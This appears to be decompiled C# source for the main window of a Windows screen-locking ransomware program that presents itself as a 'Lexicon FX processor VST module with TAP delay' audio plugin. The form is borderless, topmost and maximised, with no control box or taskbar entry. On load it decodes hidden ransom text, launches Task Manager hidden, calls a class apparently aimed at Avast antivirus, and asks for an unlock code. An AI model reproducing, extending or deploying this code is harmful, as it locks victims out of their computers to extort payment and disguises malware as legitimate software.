using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using Lexicon_FX_processor_VST_module_with_TAP_delay.Properties;

namespace Lexicon_FX_processor_VST_module_with_TAP_delay;

public class TAPDELAYGUI : Form
{
	private IContainer components;

	private Panel panel1;

	private Label label3;

	private PictureBox pictureBox2;

	private PictureBox pictureBox1;

	private Label label4;

	private Label label5;

	private Label label6;

	private TextBox textBox1;

	private Button button1;

	public TAPDELAYGUI()
	{
		InitializeComponent();
	}

	private void TAPDELAYGUI_Load(object sender, EventArgs e)
	{
		byte[] bytes = Convert.FromBase64String(Resources.firstlbl);
		((Control)label3).set_Text(Encoding.UTF8.GetString(bytes));
		byte[] bytes2 = Convert.FromBase64String(Resources.secondlbl);
		((Control)label4).set_Text(Encoding.UTF8.GetString(bytes2));
		comparebin comparebin2 = new comparebin();
		Process process = new Process();
		process.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System);
		process.StartInfo.FileName = "taskmgr.exe";
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.Start();
		((Control)this).Focus();
		((Control)label5).set_Text(comparebin2.firereplacer(Resources.thirdbl, "380679681829", "21.04.2013"));
		byte[] bytes3 = Convert.FromBase64String(Resources.fourlbl);
		((Control)label6).set_Text(Encoding.UTF8.GetString(bytes3));
		AvastSosetHui avastSosetHui = new AvastSosetHui();
		avastSosetHui.suka();
		avastSosetHui.pidoras();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_02aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b4: Expected O, but got Unknown
		//IL_0323: Unknown result type (might be due to invalid IL or missing references)
		//IL_032d: Expected O, but got Unknown
		//IL_03bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c7: Expected O, but got Unknown
		//IL_044d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0457: Expected O, but got Unknown
		//IL_053d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0547: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(TAPDELAYGUI));
		panel1 = new Panel();
		textBox1 = new TextBox();
		button1 = new Button();
		label4 = new Label();
		label5 = new Label();
		label6 = new Label();
		label3 = new Label();
		pictureBox2 = new PictureBox();
		pictureBox1 = new PictureBox();
		((Control)panel1).SuspendLayout();
		((ISupportInitialize)pictureBox2).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)panel1).set_Anchor((AnchorStyles)0);
		((Control)panel1).set_BackColor(Color.LightSteelBlue);
		panel1.set_BorderStyle((BorderStyle)1);
		((Control)panel1).get_Controls().Add((Control)(object)textBox1);
		((Control)panel1).get_Controls().Add((Control)(object)button1);
		((Control)panel1).get_Controls().Add((Control)(object)label4);
		((Control)panel1).get_Controls().Add((Control)(object)label5);
		((Control)panel1).get_Controls().Add((Control)(object)label6);
		((Control)panel1).get_Controls().Add((Control)(object)label3);
		((Control)panel1).get_Controls().Add((Control)(object)pictureBox2);
		((Control)panel1).get_Controls().Add((Control)(object)pictureBox1);
		((Control)panel1).set_Location(new Point(179, 57));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(618, 472));
		((Control)panel1).set_TabIndex(0);
		((Control)textBox1).set_Anchor((AnchorStyles)0);
		((Control)textBox1).set_Location(new Point(230, 405));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(161, 20));
		((Control)textBox1).set_TabIndex(8);
		((Control)button1).set_Anchor((AnchorStyles)0);
		((Control)button1).set_Location(new Point(230, 431));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(161, 23));
		((Control)button1).set_TabIndex(7);
		((Control)button1).set_Text("РАЗБЛОКИРОВАТЬ");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Arial", 9f, (FontStyle)1));
		((Control)label4).set_Location(new Point(1, 130));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(0, 15));
		((Control)label4).set_TabIndex(6);
		label4.set_TextAlign((ContentAlignment)32);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Arial", 9f, (FontStyle)1));
		((Control)label5).set_ForeColor(Color.Red);
		((Control)label5).set_Location(new Point(26, 190));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(7, 15));
		((Control)label5).set_TabIndex(5);
		((Control)label5).set_Text("\r\n");
		label5.set_TextAlign((ContentAlignment)32);
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Arial", 9f, (FontStyle)1));
		((Control)label6).set_Location(new Point(18, 283));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(7, 15));
		((Control)label6).set_TabIndex(4);
		((Control)label6).set_Text("\r\n");
		label6.set_TextAlign((ContentAlignment)32);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Arial", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label3).set_ForeColor(Color.Red);
		((Control)label3).set_Location(new Point(18, 84));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(0, 15));
		((Control)label3).set_TabIndex(2);
		label3.set_TextAlign((ContentAlignment)32);
		((Control)pictureBox2).set_BackColor(Color.MidnightBlue);
		((Control)pictureBox2).set_Location(new Point(0, 391));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(690, 81));
		pictureBox2.set_TabIndex(1);
		pictureBox2.set_TabStop(false);
		((Control)pictureBox1).set_BackColor(Color.MidnightBlue);
		((Control)pictureBox1).set_BackgroundImage((Image)componentResourceManager.GetObject("pictureBox1.BackgroundImage"));
		((Control)pictureBox1).set_BackgroundImageLayout((ImageLayout)2);
		((Control)pictureBox1).set_Location(new Point(0, 0));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(617, 81));
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.ActiveCaption);
		((Form)this).set_ClientSize(new Size(917, 608));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("TAPDELAYGUI");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)TAPDELAYGUI_Load);
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((ISupportInitialize)pictureBox2).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
